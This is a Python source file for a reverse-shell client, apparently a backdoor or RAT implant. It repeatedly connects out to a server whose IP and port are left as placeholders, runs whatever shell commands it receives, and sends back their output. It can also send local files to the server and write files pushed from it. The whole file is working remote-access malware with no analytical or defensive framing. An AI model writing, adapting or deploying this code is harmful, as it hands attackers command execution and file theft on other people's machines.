import socket
import time
import json
import subprocess
import os

# specify server ip and port 
SERVER_IP = "#ip"
SERVER_PORT = #port


# download file
def download_file(file_name):
    f = open(file_name, "wb")
    s.settimeout(3)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


# upload file 
def upload_file(file_name):
    f = open(file_name,'rb')
    s.send(f.read())



def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command == "clear":
            pass
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


def connection():
    while True:
        time.sleep(5)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            shell()
            s.close()
            break
        except:
            connection()

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection()
    

